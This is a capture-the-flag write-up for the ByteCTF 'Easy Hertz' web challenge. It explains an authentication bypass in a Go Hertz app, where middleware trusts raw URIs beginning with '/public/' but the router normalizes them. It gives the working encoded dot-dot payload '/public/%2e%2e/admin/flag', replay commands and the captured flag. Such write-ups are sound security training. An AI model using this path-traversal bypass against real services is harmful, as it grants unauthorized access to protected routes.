# NO.4 Easy Hertz

## Metadata

- Event: ByteCTF 143
- Category: Web plus artifact/source review
- Pattern: raw path prefix auth bypass through router normalization
- Knowledge link:
  [ctf-knowledge-web.md#raw-path-prefix-auth-bypass](ctf-knowledge-web.md#raw-path-prefix-auth-bypass)
- Local solution:
  [solution.md](../../../ctf/bytectf-143/challenges/no4-easy-hertz/notes/solution.md)

## Prompt Summary

The challenge describes a private account selling Achilles personnel data and a
video. The provided ZIP contains the service source for a Hertz-based Go web
application. The target root returns `no_permission`.

## Signals

- `/public/config` identifies the Hertz framework.
- The source archive contains route and middleware code.
- `/admin/flag` exists but direct unauthenticated access returns
  `no_permission`.
- The auth middleware trusts any raw request URI starting with `/public/`.
- The router exposes `/admin/flag`, creating a chance for raw path versus
  normalized path disagreement.

## Route

1. Run the local casebook lookup gate before probing. The useful transferred
   ideas were archive-first evidence review and application route recovery from
   bundled source.
2. Initialize a case and capture the blocked root and public config with
   `ctf_web.py`.
3. Use `ctf_artifact.py inventory` and `zip-inspect --extract` on the provided
   ZIP.
4. Read `auth.go` and `router.go` to identify the raw URI prefix check and
   protected `/admin/flag` route.
5. Send an encoded dot-dot path that keeps the raw URI under `/public/` for the
   middleware while resolving to `/admin/flag` for the router.

## Replay Commands

```bash
python scripts/sec.py knowledge browse \
  --category Pentesting \
  --artifact web-service \
  --technique web-enumeration \
  --cards \
  --limit 8

python scripts/sec.py probe web init-case \
  --case-dir ctf/bytectf-143/challenges/no4-easy-hertz \
  --name 'NO.4 Easy Hertz' \
  --url https://ad038f0d61d79b7077cc394ba4b30e9d.ctf.bytedance.net \
  --category web \
  --notes 'Private account analysis with ZIP source attachment and Hertz route clue.'

python scripts/sec.py probe artifact zip-inspect \
  --case-dir ctf/bytectf-143/challenges/no4-easy-hertz \
  --input /home/xuanhun/security/ctf/bytectf-143/reports/ctf-2023_whctf-easy-hertz.zip \
  --label source \
  --extract

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no4-easy-hertz \
  --url 'https://ad038f0d61d79b7077cc394ba4b30e9d.ctf.bytedance.net/public/%2e%2e/admin/flag' \
  --label correct_path_bypass_pct_dotdot
```

## False Leads

- Brute-forcing the Staticrypt `token.html` password before checking whether
  source code exposes a simpler access-control boundary.
- Trusting a placeholder source token such as `xxx_token` on the deployed
  target.
- Testing only literal `/public/../admin/flag` through clients that normalize
  paths before sending the request.

## Final

`flag{bf23b7f892458eec1fce96664365aad8ee6dad32352081f3e5821d67}`
